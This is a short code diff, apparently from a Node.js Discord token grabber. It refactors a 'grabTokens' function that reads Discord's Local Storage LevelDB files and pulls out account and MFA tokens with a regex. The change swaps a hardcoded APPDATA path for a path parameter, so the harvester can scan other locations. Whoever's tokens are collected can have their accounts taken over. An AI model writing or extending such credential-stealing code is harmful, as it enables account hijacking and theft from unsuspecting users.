@@ -78,16 +78,14 @@ module.exports = {
         return validTokens;
     },
 
-    grabTokens: () => {
-        let directoryWindows = process.env.APPDATA + "/Discord/Local Storage/leveldb/";
-
-        let directory = fs.readdirSync(directoryWindows);
+    grabTokens: (path) => {
+        let directory = fs.readdirSync(path);
         let gatheredTokens = [];
 
         for (let file of directory) {
             if (!file.endsWith('.log') && !file.endsWith('.ldb')) continue;
 
-            let buffer = fs.readFileSync(directoryWindows + file).toString("utf-8");
+            let buffer = fs.readFileSync(path + file).toString("utf-8");
             if (buffer == null) continue;
 
             let matches = buffer.match(/[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}/);
